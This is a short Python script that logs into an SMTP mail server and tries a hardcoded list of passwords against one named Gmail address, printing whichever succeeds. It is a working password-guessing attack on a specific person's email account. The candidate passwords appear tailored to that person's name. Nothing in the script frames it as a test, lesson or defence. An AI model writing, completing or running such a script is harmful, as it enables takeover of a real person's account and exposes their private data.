import smtplib
naser = smtplib.SMTP("smtp.live.com", 587)
naser.ehlo()
naser.starttls()

user = input('enter your email: ')
user = "samer.elhamdoo@gmail.com"
#passfile = input('enter the password file: ')
#passfile = open(passfile, "r")
passwords = ['jajdjsd', 'samerbilal1990', '154656jsd', 'gsajhyhzck', 'hvcbhdha','gdgygujbgjda','samerhazard1990','samerbilal1990']


for password in passwords:
    try:
        naser.login(user, password)
        print('pass is = {}'.format(password))
        break
    except smtplib.SMTPAuthenticationError:
        print('is password ( {} ) null'.format(password))

